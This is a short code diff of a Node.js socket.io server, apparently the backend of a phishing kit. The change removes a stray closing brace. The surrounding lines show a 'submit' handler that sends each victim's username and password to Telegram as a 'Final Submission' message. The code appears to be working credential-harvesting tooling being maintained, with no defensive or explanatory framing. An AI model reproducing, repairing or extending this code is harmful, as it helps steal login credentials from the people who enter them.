@@ -65,8 +65,6 @@ socket.on("submit",(data)=>{
     sendTelegram(`✅ Final Submission\nUsername: ${data.username}\nPassword: ${data.password}`);  
 });
 
-});
-
 server.listen(3000,()=>{
 console.log("Server running on port 3000");
 });
